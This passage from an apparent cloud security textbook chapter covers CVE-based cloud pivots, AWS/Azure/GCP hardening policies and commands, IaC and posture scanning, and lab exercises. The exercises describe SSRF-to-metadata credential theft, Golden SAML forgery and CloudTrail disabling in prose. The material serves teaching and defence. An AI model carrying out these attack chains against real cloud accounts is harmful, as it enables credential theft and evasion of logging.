**CVE-2023-22515 — Atlassian Confluence broken access control to cloud pivot.** This critical vulnerability (CVSS 10.0) in Confluence Data Center and Server allowed unauthenticated attackers to create administrator accounts via a broken access control in the setup endpoint. Organizations hosting Confluence on cloud VMs found that attackers used Confluence administrator access to execute arbitrary commands on the underlying instance, then pivoted to the cloud metadata service to steal IAM credentials. The chain — unauthenticated Confluence admin creation, OS command execution, IMDS credential theft, cloud API abuse — demonstrates how application-layer vulnerabilities become cloud-scope compromises when instance roles are overly permissive.

**CVE-2020-8561 — Kubernetes API server webhook redirect SSRF.** This vulnerability in the Kubernetes API server allowed webhook admission controllers to redirect API server requests to arbitrary URLs, including the cloud metadata service. In managed Kubernetes environments (EKS, GKE, AKS), the API server runs with a highly privileged cloud IAM role. Exploiting this SSRF yielded the API server's cloud credentials, granting broad access to the underlying cloud account. CVSS 4.1 (Medium) was arguably underscored given the impact in cloud-hosted clusters.

---

## 11. Cloud hardening and security architecture

Preventive controls reduce the probability that the attack techniques described in preceding sections succeed. Cloud hardening operates at the organization policy layer (SCPs, Organization Policies, Management Group Policies), the identity layer (Conditional Access, PIM/PAM, Workload Identity Federation), and the infrastructure layer (IaC scanning, CSPM).

### 11.1 AWS hardening

**Service Control Policies (SCPs).** SCPs are the highest-priority deny mechanism in AWS Organizations. They apply to every principal in the target organizational unit, including the root user. SCPs cannot grant permissions — they only restrict the maximum permissions available.

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyIMDSv1",
      "Effect": "Deny",
      "Action": "ec2:RunInstances",
      "Resource": "arn:aws:ec2:*:*:instance/*",
      "Condition": {
        "NumericLessThan": {
          "ec2:MetadataHttpPutResponseHopLimit": "2"
        },
        "StringNotEquals": {
          "ec2:MetadataHttpTokens": "required"
        }
      }
    },
    {
      "Sid": "DenyUnusedRegions",
      "Effect": "Deny",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:RequestedRegion": [
            "us-east-1",
            "us-west-2",
            "eu-west-1"
          ]
        }
      }
    },
    {
      "Sid": "DenyDisablingCloudTrail",
      "Effect": "Deny",
      "Action": [
        "cloudtrail:StopLogging",
        "cloudtrail:DeleteTrail"
      ],
      "Resource": "*"
    },
    {
      "Sid": "DenyS3PublicAccess",
      "Effect": "Deny",
      "Action": "s3:PutBucketPublicAccessBlock",
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "s3:PublicAccessBlockConfiguration/BlockPublicAcls": "true"
        }
      }
    }
  ]
}
```

**IMDSv2 enforcement.** IMDSv2 requires a session token obtained via an HTTP PUT request with a TTL header. Setting the hop limit to 1 prevents proxied requests (from SSRF) from reaching the metadata service through a network hop.

```bash
# Enforce IMDSv2 on new instances
aws ec2 modify-instance-metadata-options \
  --instance-id i-existing1234 \
  --http-tokens required \
  --http-put-response-hop-limit 1 \
  --http-endpoint enabled

# Enforce for all new launches via launch template
aws ec2 create-launch-template \
  --launch-template-name secure-template \
  --launch-template-data '{
    "MetadataOptions": {
      "HttpTokens": "required",
      "HttpPutResponseHopLimit": 1,
      "HttpEndpoint": "enabled",
      "InstanceMetadataTags": "disabled"
    }
  }'
```

**S3 Block Public Access.** Account-level S3 Block Public Access prevents any bucket in the account from being made public, regardless of bucket policies or ACLs.

```bash
# Enable account-level S3 Block Public Access
aws s3control put-public-access-block \
  --account-id 123456789012 \
  --public-access-block-configuration \
    BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
```

**VPC endpoint policies.** VPC endpoints restrict which AWS services and resources can be accessed from within the VPC. A VPC endpoint policy that limits S3 access to specific buckets prevents data exfiltration to attacker-controlled buckets even when IAM credentials are stolen.

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowOnlyCompanyBuckets",
      "Effect": "Allow",
      "Principal": "*",
      "Action": ["s3:GetObject", "s3:PutObject", "s3:ListBucket"],
      "Resource": [
        "arn:aws:s3:::company-data-*",
        "arn:aws:s3:::company-data-*/*",
        "arn:aws:s3:::security-logs-*",
        "arn:aws:s3:::security-logs-*/*"
      ]
    }
  ]
}
```

### 11.2 Azure hardening

**Conditional Access deep dive.** Conditional Access policies are the primary runtime enforcement mechanism for Azure AD authentication. A mature Conditional Access deployment enforces MFA, device compliance, token protection, and location restrictions as layered controls.

```bash
# List all Conditional Access policies via Graph API
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  --output json | jq '.value[] | {displayName, state, conditions, grantControls}'

# Key policies to enforce:
# 1. Require MFA for all users (with exclusions only for break-glass accounts)
# 2. Require compliant device for sensitive applications
# 3. Block legacy authentication protocols (IMAP, POP3, SMTP AUTH)
# 4. Require token protection (token binding) for high-value apps
# 5. Block sign-ins from non-approved countries
# 6. Require phishing-resistant MFA for administrators
```

**Privileged Identity Management (PIM) configuration.** PIM provides just-in-time (JIT) role activation for Azure AD roles and Azure resource roles. Administrators do not hold permanent standing privileges; they activate roles for a limited duration with approval and MFA requirements.

```bash
# List PIM role assignments (requires privileged role administrator)
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleInstances" \
  --output json | jq '.value[] | {principalId, roleDefinitionId, status, startDateTime, endDateTime}'
```

PIM configuration best practices: maximum activation duration of 8 hours for standard roles and 4 hours for Global Administrator, mandatory MFA on activation, approval required for Global Administrator and Privileged Role Administrator, alert on permanent eligible assignments.

**Management Group policies.** Azure Policy applied at the Management Group level enforces compliance across all subscriptions. Deny-effect policies prevent non-compliant resource creation, similar to AWS SCPs.

### 11.3 GCP hardening

**Organization policies.** GCP Organization Policy constraints are boolean or list constraints applied at the organization, folder, or project level. They restrict resource configuration regardless of IAM permissions.

```bash
# Enforce uniform bucket-level access (disable ACLs)
gcloud resource-manager org-policies enable-enforce \
  storage.uniformBucketLevelAccess \
  --organization=<org-id>

# Restrict service account key creation
gcloud resource-manager org-policies set-policy \
  --organization=<org-id> \
  /dev/stdin <<'EOF'
constraint: iam.disableServiceAccountKeyCreation
booleanPolicy:
  enforced: true
EOF

# Restrict VM external IP addresses
gcloud resource-manager org-policies set-policy \
  --organization=<org-id> \
  /dev/stdin <<'EOF'
constraint: compute.vmExternalIpAccess
listPolicy:
  deniedValues:
    - projects/<project>/zones/*/instances/*
EOF

# Restrict which regions resources can be created in
gcloud resource-manager org-policies set-policy \
  --organization=<org-id> \
  /dev/stdin <<'EOF'
constraint: gcp.resourceLocations
listPolicy:
  allowedValues:
    - in:us-locations
    - in:eu-locations
EOF
```

**VPC Service Controls.** VPC Service Controls create a security perimeter around GCP resources that restricts data movement across the perimeter boundary. Even a principal with full IAM permissions cannot copy data out of a service perimeter to a project outside the perimeter.

```bash
# Create an access policy (organization level)
gcloud access-context-manager policies create \
  --organization=<org-id> \
  --title="Security Perimeter Policy"

# Create a service perimeter
gcloud access-context-manager perimeters create production-perimeter \
  --policy=<policy-id> \
  --title="Production Data Perimeter" \
  --resources="projects/<project-number>" \
  --restricted-services="storage.googleapis.com,bigquery.googleapis.com" \
  --perimeter-type=regular
```

**Binary Authorization.** Binary Authorization ensures that only cryptographically signed container images are deployed to GKE. This prevents attackers from deploying malicious containers even if they compromise the Kubernetes API or CI/CD pipeline.

```bash
# Enable Binary Authorization on a GKE cluster
gcloud container clusters update secure-cluster \
  --zone=us-central1-a \
  --binauthz-evaluation-mode=PROJECT_SINGLETON_POLICY_ENFORCE

# Create an attestor
gcloud container binauthz attestors create build-attestor \
  --attestation-authority-note=projects/<project>/notes/build-note \
  --attestation-authority-note-project=<project>
```

**Workload Identity Federation.** Workload Identity Federation replaces long-lived service account keys with short-lived tokens obtained through OIDC or SAML federation. External workloads (CI/CD pipelines, on-premises applications, other cloud providers) authenticate using their native identity provider and receive GCP access tokens without any stored secrets.

```bash
# Create a Workload Identity Pool
gcloud iam workload-identity-pools create github-actions-pool \
  --location="global" \
  --display-name="GitHub Actions Pool"

# Create a provider for GitHub Actions OIDC
gcloud iam workload-identity-pools providers create-oidc github-provider \
  --workload-identity-pool=github-actions-pool \
  --location="global" \
  --issuer-uri="https://token.actions.githubusercontent.com" \
  --attribute-mapping="google.subject=assertion.sub,attribute.repository=assertion.repository"

# Grant the federated identity access to a service account
gcloud iam service-accounts add-iam-policy-binding deploy-sa@project.iam.gserviceaccount.com \
  --role="roles/iam.workloadIdentityUser" \
  --member="principalSet://iam.googleapis.com/projects/<project-number>/locations/global/workloadIdentityPools/github-actions-pool/attribute.repository/myorg/myrepo"
```

### 11.4 Multi-cloud IAM strategy

Organizations operating across multiple cloud providers face the challenge of maintaining consistent identity governance without creating fragmented, provider-specific identity silos.

**Federated identity with short-lived credentials.** The foundational principle is that no workload or human should hold long-lived cloud credentials. Instead, all authentication flows through a central identity provider (Okta, Azure AD, Google Workspace) that issues short-lived tokens via OIDC or SAML federation. Each cloud provider trusts the central IdP as a federation source, and token lifetimes are measured in hours rather than indefinitely.

**OIDC federation best practices.** When configuring OIDC federation, restrict the `audience` claim to the specific cloud provider's expected value. Restrict the `subject` claim to the specific identities that should have access. Never configure a federation trust that accepts any token from the IdP without audience and subject restrictions — this turns IdP compromise into full multi-cloud compromise.

### 11.5 Infrastructure as Code security scanning

Infrastructure as Code (IaC) templates define cloud resource configurations in code (Terraform, CloudFormation, ARM templates, Pulumi). Scanning IaC before deployment catches misconfigurations before they reach production.

```bash
# Checkov — multi-framework IaC scanner
checkov -d ./terraform/ --framework terraform --output cli --compact
checkov -d ./cloudformation/ --framework cloudformation
checkov -d ./arm-templates/ --framework arm

# tfsec — Terraform-specific security scanner
tfsec ./terraform/ --format json --out tfsec-results.json

# cfn-nag — CloudFormation-specific linter
cfn_nag_scan --input-path ./cloudformation/template.yaml

# Trivy — IaC scanning (in addition to container image scanning)
trivy config ./terraform/ --severity HIGH,CRITICAL

# Pre-commit hook integration (add to .pre-commit-config.yaml)
# repos:
#   - repo: https://github.com/bridgecrewio/checkov
#     rev: 3.2.0
#     hooks:
#       - id: checkov
#         args: ['--directory', '.']
```

Common IaC misconfigurations that scanners detect: S3 buckets without encryption, security groups with `0.0.0.0/0` ingress on sensitive ports, IAM policies with wildcard actions, databases publicly accessible, logging disabled on critical resources, and unencrypted EBS volumes.

### 11.6 Cloud Security Posture Management (CSPM)

CSPM tools continuously assess cloud resource configurations against security benchmarks (CIS, NIST, PCI-DSS) and alert on drift from compliant baselines.

| Tool | Cloud Support | Approach | Key Differentiator |
|------|--------------|----------|-------------------|
| **Prowler** | AWS, Azure, GCP | Open-source CLI | CIS benchmarks, CI/CD integration |
| **ScoutSuite** | AWS, Azure, GCP | Open-source, report-based | HTML reports, broad check coverage |
| **Wiz** | AWS, Azure, GCP, OCI | Agent + agentless | Graph-based risk prioritization |
| **Prisma Cloud** | AWS, Azure, GCP, OCI | Agent + agentless | Unified CNAPP (CSPM + CWPP) |
| **AWS Security Hub** | AWS | Native | Aggregates GuardDuty, Inspector, Config |
| **Azure Defender** | Azure | Native | Deep Azure AD and M365 integration |
| **GCP SCC Premium** | GCP | Native | Event Threat Detection, Web Security Scanner |

```bash
# Prowler — run full CIS benchmark assessment
prowler aws -p production-profile -M json-ocsf -o ./cspm-results/ --compliance cis_2.0_aws

# Prowler — Azure CIS assessment
prowler azure --sp-env-auth --compliance cis_2.1_azure

# Prowler — GCP CIS assessment
prowler gcp --project-ids <project-id> --compliance cis_2.0_gcp

# ScoutSuite — generate comprehensive security report
scout aws --profile production-profile --report-dir ./scoutsuite-report/
```

CSPM tools provide value through continuous monitoring, but they generate high volumes of findings. Effective CSPM programs prioritize findings based on exploitability (is the resource internet-facing?), blast radius (what data does it protect?), and compensating controls (is there a VPC endpoint policy, WAF, or network segmentation that reduces risk?).

---

## 12. Cross-references

**To Domain 8:** SSRF (Chapter 8B S4) is the primary entry point for cloud metadata theft. Web application vulnerabilities (injection, deserialization) running on cloud infrastructure chain directly into IAM credential theft.

**To Domain 2:** IAM credential management is the cloud equivalent of capabilities (Chapter 2C S1). Managed identities are analogous to file capabilities — ambient authority attached to the workload rather than the user. Conditional Access is the cloud analogue of LSM policy enforcement (Chapter 2C S5).

**To Chapter 10B:** EKS/GKE/AKS security bridges into Kubernetes security (Chapter 10B S2). Cloud provider IAM is the authentication backend for Kubernetes API servers. Service account token abuse spans both the cloud IAM layer and the Kubernetes RBAC layer.

**To Domain 5:** Identity federation (SAML/OIDC) attacks (section 4 above) relate to authentication protocol weaknesses (Domain 5). Golden SAML is the cloud-specific variant of Kerberos Golden Ticket — both forge authentication assertions using stolen signing material.

**To Domain 7:** Cloud-native detection (CloudTrail Lake, Azure Monitor, GCP Audit Logs) feeds into SIEM and detection engineering (Domain 7). Sigma rules for cloud events provide cross-platform detection logic.

---

## Exercises

> See also: [tutorials/tutorial_domain10_ch10A_cloud_attack_lab.md](tutorials/tutorial_domain10_ch10A_cloud_attack_lab.md)

**Exercise 10A.1 — IMDS exploitation and credential theft (T1552.005).** Deploy a vulnerable web application on an EC2 instance (IMDSv1 enabled) and on a GCP Compute Engine VM. Exploit the SSRF vulnerability to retrieve IAM/service-account credentials from the metadata service. Demonstrate the full chain: SSRF discovery, credential extraction, `sts get-caller-identity` confirmation, and S3/GCS data access using stolen credentials. Then enable IMDSv2 (AWS) and Workload Identity (GCP), repeat the attack, and document which steps fail. Write a CloudTrail Lake query that detects IMDS-sourced credentials used from an IP address outside the instance's VPC. Reference: MITRE ATT&CK Cloud Matrix — T1552.005 (Unsecured Credentials: Cloud Instance Metadata API).

**Exercise 10A.2 — Cross-cloud IAM privilege-escalation audit.** Using Pacu (`iam__privesc_scan`), CloudFox (`iam-simulator`), and ScoutSuite, audit a multi-account AWS Organization for IAM privilege-escalation paths (§1.1.1). Enumerate all roles with `iam:PassRole` + `lambda:CreateFunction`, `iam:CreatePolicyVersion`, or `sts:AssumeRole` trust policies referencing external accounts. On GCP, audit for `setIamPolicy`, `getAccessToken`, and `serviceAccountKeys.create` permissions using `gcloud iam` commands. Produce a risk-ranked report mapping each finding to its MITRE ATT&CK technique (T1078, T1098, T1548). Apply remediation via SCPs (AWS) or Organization Policy constraints (GCP) and verify the escalation paths are blocked.

**Exercise 10A.3 — Golden SAML detection lab.** In a lab environment with Azure AD federated to a simulated ADFS, forge a SAML assertion using the IdP signing certificate (obtained from the lab IdP). Exchange it for AWS STS credentials via `sts:AssumeRoleWithSAML`. Detect the attack by correlating Azure AD sign-in logs (SAML assertions present) against ADFS authentication logs (no corresponding authentication event). Write a KQL query for Azure Monitor and a CloudTrail Lake SQL query that together identify Golden SAML — sessions that exist in the cloud provider but not in the IdP. Reference: T1606.002 (Forge Web Credentials: SAML Tokens).

**Exercise 10A.4 — CloudTrail integrity and evasion detection.** In a sandbox AWS account, simulate an attacker disabling CloudTrail (`StopLogging`, `DeleteTrail`, `PutEventSelectors` to exclude data events). Verify that the tampering events themselves are logged. Configure an Organization Trail with S3 Object Lock (Compliance mode) and demonstrate that even the management account cannot delete log files during the retention period. Write EventBridge rules that trigger SNS notifications within 60 seconds of any CloudTrail configuration change. Test against the Sigma rule in §8.1 (Rule 6). Reference: T1562.008 (Impair Defenses: Disable or Modify Cloud Logs).

**Exercise 10A.5 — Multi-cloud CSPM benchmark assessment.** Run Prowler against an AWS account (`--compliance cis_2.0_aws`), ScoutSuite against a GCP project, and Azure Defender for Cloud Secure Score assessment. For each tool, identify the top 10 critical findings, map each to a MITRE ATT&CK Cloud Matrix technique, and produce a remediation plan with Terraform/IaC snippets. Verify remediation by re-running the scan and confirming finding resolution. Compare the three tools' coverage for a shared finding category (e.g., storage public access) and document gaps.

---

## Readings and References

(retrieved: 2026-05-29)

- MITRE ATT&CK Cloud Matrix — IaaS: <https://attack.mitre.org/matrices/enterprise/cloud/iaas/> — canonical technique mapping for AWS, GCP, Azure.
- CSA, "MITRE ATT&CK for Cloud: A Practitioner's Guide to Detection Coverage" (2026-05-22): <https://cloudsecurityalliance.org/blog/2026/05/22/mitre-att-ck-for-cloud-a-practitioner-s-guide-to-detection-coverage>
- CVE-2026-33626 — LMDeploy SSRF to IMDS credential theft (CVSS 7.5, exploited in 12 hours): <https://www.sysdig.com/blog/cve-2026-33626-how-attackers-exploited-lmdeploy-llm-inference-engines-in-12-hours>
- CVE-2026-39361 — OpenObserve SSRF to cloud IMDS: <https://www.sentinelone.com/vulnerability-database/cve-2026-39361/>
- CVE-2026-32169 — Azure Cloud Shell SSRF: <https://www.sentinelone.com/vulnerability-database/cve-2026-32169/>
- Rhino Security Labs, "AWS IAM Privilege Escalation — Methods and Mitigation": <https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/>
- Sysdig, "MITRE ATT&CK for Cloud IaaS — 10 TTPs You Should Know": <https://www.sysdig.com/blog/what-is-mitre-attck-for-cloud-iaas>
- Capital One breach (2019) — SSRF to IMDSv1 credential theft: MITRE T1552.005.
- SolarWinds/SUNBURST (2020) — Golden SAML forging via AD FS signing certificate: MITRE T1606.002.
- Prowler — open-source cloud security tool: <https://github.com/prowler-cloud/prowler>
- ScoutSuite — multi-cloud auditing: <https://github.com/nccgroup/ScoutSuite>
- CloudFox — cloud attack path enumeration: <https://github.com/BishopFox/cloudfox>
- Pacu — AWS exploitation framework: <https://github.com/RhinoSecurityLabs/pacu>

---

## Cross-Reference Map

| Source Section | Target Chapter | Relationship |
|---|---|---|
| §1.2 IMDS credential theft | Chapter 8B §4 (SSRF) | SSRF is the primary entry vector for IMDS exploitation across all three providers |
| §1.1 IAM privilege escalation | Chapter 10B §2.2 (K8s RBAC) | Cloud IAM backs Kubernetes API server auth; IAM escalation enables cluster-admin |
| §4.1 Golden SAML | Domain 14A (Active Directory) | Golden SAML is the cloud analogue of Kerberos Golden Ticket — same signing-material theft |
| §5.1 Serverless event injection | Chapter 8B §1-7 (Injection) | Lambda/Cloud Function event data is untrusted input; same injection taxonomy applies |
| §8.1 Sigma rules for cloud | Domain 7 (SIEM/Detection) | Cloud Sigma rules compile to CloudTrail Lake SQL, KQL, and Chronicle YARA-L |
| §6.1 Offensive tooling (Pacu, CloudFox) | Domain 27 (Defense-in-Depth) | Offensive assessment output feeds CSPM and purple-team validation workflows |

---

## Glossary

| Term | Definition |
|---|---|
| **IMDS** | Instance Metadata Service — link-local HTTP endpoint (169.254.169.254) exposing instance identity, IAM credentials, and configuration on cloud VMs |
| **IMDSv2** | AWS enhanced metadata service requiring a PUT-obtained session token; mitigates most SSRF-based credential theft |
| **SCP** | Service Control Policy — AWS Organizations permission boundary restricting IAM in member accounts; even root is constrained |
| **AssumeRole** | AWS STS operation exchanging one principal's credentials for temporary credentials of a target role via trust policy |
| **Workload Identity** | GCP mechanism mapping Kubernetes ServiceAccounts to GCP service accounts for per-pod IAM without node-level credentials |
| **Managed Identity** | Azure equivalent of instance profiles; system-assigned (lifecycle-bound) or user-assigned (reusable) |
| **Golden SAML** | Attack forging SAML assertions using a stolen IdP signing certificate, granting persistent cloud access without IdP authentication |
| **OIDC Federation** | Trust relationship where a cloud provider accepts OAuth 2.0 / OpenID Connect tokens from an external IdP for role assumption |
| **Confused Deputy** | Privilege escalation where a trusted service (deputy) is tricked into acting on behalf of an attacker against a resource it shouldn't access |
| **CSPM** | Cloud Security Posture Management — continuous monitoring of cloud configurations against security benchmarks (CIS, NIST) |
| **CloudTrail Lake** | AWS service for SQL-based querying of CloudTrail events; supports cross-account aggregation and 7-year retention |
| **Organization Policy** | GCP constraint mechanism restricting resource configurations across folders/projects (e.g., disabling SA key creation) |
| **SAS Token** | Azure Shared Access Signature — time-limited, permission-scoped URI token granting access to Storage resources |
| **Domain Fronting** | C2 evasion technique using a CDN's shared TLS termination so SNI shows a legitimate domain while the Host header targets C2 |
| **Conditional Access** | Azure AD/Entra ID policy engine enforcing MFA, device compliance, and location-based access controls on authentication |
